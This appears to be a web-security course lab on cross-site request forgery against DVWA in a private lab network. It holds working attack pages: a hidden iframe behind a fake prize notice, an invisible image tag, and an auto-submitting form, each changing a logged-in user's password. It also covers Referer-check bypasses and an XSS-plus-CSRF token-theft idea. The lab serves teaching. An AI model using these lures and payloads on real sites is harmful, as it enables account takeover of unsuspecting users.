# 🔬 Lab Exercise 5: CSRF (Cross-Site Request Forgery) Attack

> **Challenge:** Craft requests that perform actions on behalf of an authenticated user
> **Where:** DVWA on Metasploitable + Kali (custom HTML pages)
> **Time:** ~40-50 minutes

---

## Exercise 5A: Understand DVWA CSRF — Password Change Flow

**Target:** `http://192.168.56.20/dvwa/vulnerabilities/csrf/`

> **Prerequisite:** DVWA security set to **Low**

```
Step 1: Normal usage — change password
  - Go to http://192.168.56.20/dvwa/vulnerabilities/csrf/
  - Enter New password: test123
  - Confirm: test123
  - Click Change
  ✅ EXPECTED: "Password Changed."

Step 2: Examine the request
  - Look at the URL bar after submitting:
    http://192.168.56.20/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change
  📝 This is a GET request! Parameters are in the URL
  📝 There is NO CSRF token protecting this request

Step 3: View the source code
  - Click "View Source" on the DVWA page
  - 📝 Does the server check the Referer header?
  - 📝 Does the server use a CSRF token?
  - 📝 What validation (if any) is performed?

Step 4: Reset password back to "password"
  - Enter New password: password
  - Confirm: password
  - Click Change
```

---

## Exercise 5B: Craft a Malicious HTML Page — Auto-Submit CSRF

**Task:** Create a malicious HTML page that changes the DVWA password when opened.

```bash
# Step 1: Create the malicious HTML file on Kali
cat > /tmp/csrf_attack.html << 'HTMLEOF'
<html>
<head><title>You Won a Prize!</title></head>
<body>
  <h1>🎉 Congratulations! You won a $500 Gift Card!</h1>
  <p>Click below to claim your prize...</p>

  <!-- Hidden iframe that silently changes the DVWA password -->
  <iframe src="http://192.168.56.20/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
          style="display:none" width="0" height="0">
  </iframe>

  <p>If nothing happens, <a href="#">click here</a>.</p>
</body>
</html>
HTMLEOF

# Step 2: Open this page in Firefox (while logged into DVWA)
firefox /tmp/csrf_attack.html &

# Step 3: Verify the attack worked
# Try logging out of DVWA and logging back in:
# Username: admin
# Password: hacked (the CSRF-changed password)
# ✅ EXPECTED: Login succeeds with "hacked" — the password was changed!

# Step 4: Reset password back to "password"
# Login → go to CSRF page → change back to "password"
```

---

## Exercise 5C: CSRF with Image Tag (GET-based)

```bash
# Step 1: Create a CSRF attack using an img tag
cat > /tmp/csrf_img.html << 'HTMLEOF'
<html>
<body>
  <h1>Check out this cute cat! 🐱</h1>

  <!-- This invisible image tag triggers the password change -->
  <img src="http://192.168.56.20/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change"
       width="1" height="1" style="opacity:0" />

  <img src="https://placekitten.com/400/300" alt="Cute cat" />
</body>
</html>
HTMLEOF

# Step 2: Open in Firefox (while logged into DVWA)
firefox /tmp/csrf_img.html &

# Step 3: Verify the password changed
# Logout and login with: admin / pwned
# ✅ EXPECTED: Login works — CSRF via image tag!

# 📝 Why does this work?
# The browser automatically sends cookies (including DVWA session)
# when loading the image URL, so the server thinks it's a legitimate request

# Step 4: Reset password back to "password"
```

---

## Exercise 5D: Auto-Submit Form CSRF (POST simulation)

```bash
# Step 1: Create a CSRF form that auto-submits
cat > /tmp/csrf_form.html << 'HTMLEOF'
<html>
<body onload="document.getElementById('csrfForm').submit();">
  <h1>Loading...</h1>

  <form id="csrfForm"
        action="http://192.168.56.20/dvwa/vulnerabilities/csrf/"
        method="GET">
    <input type="hidden" name="password_new" value="formhacked" />
    <input type="hidden" name="password_conf" value="formhacked" />
    <input type="hidden" name="Change" value="Change" />
  </form>
</body>
</html>
HTMLEOF

# Step 2: Open in Firefox (while logged into DVWA)
firefox /tmp/csrf_form.html &

# ✅ EXPECTED: The form auto-submits and you're redirected to DVWA
#    with "Password Changed." message
# 📝 The password is now "formhacked"

# Step 3: Reset password back to "password"
```

---

## Exercise 5E: CSRF at Medium Security — Referer Bypass

**Target:** DVWA CSRF at **Medium** security

```
Step 1: Change DVWA security to Medium
  - Go to http://192.168.56.20/dvwa/security.php → set to "Medium"

Step 2: Try the iframe CSRF attack again
  - Open /tmp/csrf_attack.html in Firefox
  📝 Did it work? ______________

Step 3: View the Medium security source code
  - Click "View Source" on the DVWA CSRF page
  📝 What protection was added?
  📝 Does it check: CSRF token? Referer header? Origin header?
  ✅ EXPECTED: Medium checks if the Referer contains the server hostname

Step 4: Bypass the Referer check
  - Technique 1: Include the target hostname in your URL
    Save your malicious page as: /tmp/192.168.56.20.html
    (The filename contains the target hostname)
    Open it in Firefox
    📝 Did the Referer check pass?

  - Technique 2: Use Burp to modify the Referer header
    - Turn Intercept ON
    - Open /tmp/csrf_attack.html
    - In Burp, find the request to DVWA
    - Add/modify: Referer: http://192.168.56.20/dvwa/vulnerabilities/csrf/
    - Forward the request
    📝 Did the CSRF attack work now?
```

---

## Exercise 5F: Explore CSRF Protections

**Task:** Understand how proper CSRF protections work.

```
Step 1: Change DVWA security to High
  - Go to http://192.168.56.20/dvwa/security.php → set to "High"

Step 2: Examine the CSRF page
  - Go to http://192.168.56.20/dvwa/vulnerabilities/csrf/
  - View Source (Ctrl+U)
  - 📝 Find the hidden field — is there a user_token?
  - 📝 What does the token look like?

Step 3: Try the CSRF attack
  - Open /tmp/csrf_attack.html
  📝 Did the attack work? (It should NOT work)
  📝 Why? The server requires a valid CSRF token with each request

Step 4: Attempt token extraction (requires XSS + CSRF combo)
  - The only way to get the token is to read the DVWA page first
  - This would require an XSS vulnerability on the same domain

  # Concept: If you had XSS on the DVWA domain, you could:
  # 1. Use XSS to fetch the CSRF page
  # 2. Extract the user_token from the response
  # 3. Make the CSRF request with the valid token
  # This is why XSS + CSRF together are extremely dangerous!

Step 5: Understand CSRF prevention best practices
  📝 List the CSRF defenses you observed:
    - Low: ______________ (none)
    - Medium: ______________ (Referer check)
    - High: ______________ (CSRF token)
    - Impossible: ______________ (view source to find out!)
```

---

## ✅ Completion Checklist

- [ ] Analyzed DVWA CSRF page and understood GET-based password change (5A)
- [ ] Crafted malicious HTML page with hidden iframe CSRF (5B)
- [ ] Performed CSRF with invisible image tag (5C)
- [ ] Created auto-submitting CSRF form (5D)
- [ ] Bypassed Medium security Referer check (5E)
- [ ] Explored High security CSRF token protection (5F)

---

**Next:** [Challenge 24: SSRF →](./06_lab_ssrf.md)
